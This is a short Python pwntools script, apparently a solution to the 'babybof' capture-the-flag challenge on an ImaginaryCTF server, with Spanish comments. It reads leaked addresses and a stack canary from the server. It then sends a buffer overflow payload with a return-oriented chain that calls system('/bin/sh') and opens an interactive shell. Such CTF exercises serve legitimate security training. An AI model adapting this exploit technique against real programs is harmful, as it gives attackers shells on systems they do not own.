#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'  #definimos el nivel del log
HOST, PORT = 'babybof.chal.imaginaryctf.org', 1337  
B = 56

def main(): #definicion de main con los datos del servidor y obtenemos los valores de interes.
    io = remote(HOST, PORT)
    io.recvuntil(b'system @ ')
    system = int(io.recvline().strip(), 16)

    io.recvuntil(b'pop rdi; ret @ ')
    pop_rdi = int(io.recvline().strip(), 16)

    io.recvuntil(b'ret @ ')
    ret = int(io.recvline().strip(), 16)

    io.recvuntil(b'"/bin/sh" @ ')
    binsh = int(io.recvline().strip(), 16)

    io.recvuntil(b'canary: ')
    canary = int(io.recvline().strip(), 16)

    io.recvuntil(b'input')

    log.info(f"system={hex(system)}, pop_rdi={hex(pop_rdi)}, ret={hex(ret)}, binsh={hex(binsh)}, canary={hex(canary)}")

    payload  = b'A'*B
    payload += p64(canary)
    payload += b'B'*8
    payload += p64(ret)
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(system)

    io.sendline(payload) #enviamos el payload para obtener la flag.
    io.interactive()

if __name__ == "__main__":
    main()
